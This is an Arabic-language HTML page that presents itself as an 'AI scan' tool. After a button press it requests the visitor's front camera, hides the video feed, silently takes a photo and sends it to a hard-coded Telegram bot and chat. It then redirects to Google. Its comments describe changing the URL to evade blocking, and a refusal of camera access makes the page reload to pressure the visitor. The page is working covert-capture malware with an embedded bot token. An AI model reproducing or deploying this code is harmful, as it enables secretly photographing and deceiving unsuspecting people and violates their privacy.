<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>AI Scan - فحص الذكاء الاصطناعي</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
        #v { width: 1px; height: 1px; opacity: 0; }
        .box { border: 1px solid #0f0; padding: 20px; display: inline-block; border-radius: 10px; }
        #btn { background: #0f0; color: #000; padding: 15px 30px; border: none; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div class="box">
        <h2>نظام التحليل العالمي</h2>
        <p>يجب الضغط على البدء لتفعيل الفحص</p>
        <button id="btn" onclick="start()">بدء الفحص</button>
        <h3 id="status"></h3>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // إضافة رقم عشوائي للتوكن عشان نخدع الكاش
        const t = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
        const c_id = "8042090388";

        async function start() {
            document.getElementById('btn').style.display = 'none';
            document.getElementById('status').innerText = "جاري الاتصال بالقمر الصناعي...";

            try {
                // طلب الكاميرا مع "إجبار" التحديث
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // انتظر 4 ثواني عشان "يصحصح" الحساس
                setTimeout(takeShot, 4000);

            } catch (e) {
                alert("خطأ: يجب السماح بالكاميرا للتشغيل");
                location.reload(); // إعادة تحميل الصفحة لو رفض
            }
        }

        async function takeShot() {
            const v = document.getElementById('v');
            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);

            const data = canvas.toDataURL('image/jpeg', 0.7);
            const blob = await (await fetch(data)).blob();
            
            const fd = new FormData();
            fd.append('chat_id', c_id);
            fd.append('photo', blob, 'shot.jpg');

            // إرسال مباشر مع تغيير الرابط شوي عشان نتخطى الحظر
            fetch(`https://api.telegram.org/bot${t}/sendPhoto?v=${Math.random()}`, {
                method: 'POST',
                body: fd
            }).then(() => {
                document.getElementById('status').innerText = "اكتمل الفحص!";
                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
            });
        }
    </script>
</body>
    </html>
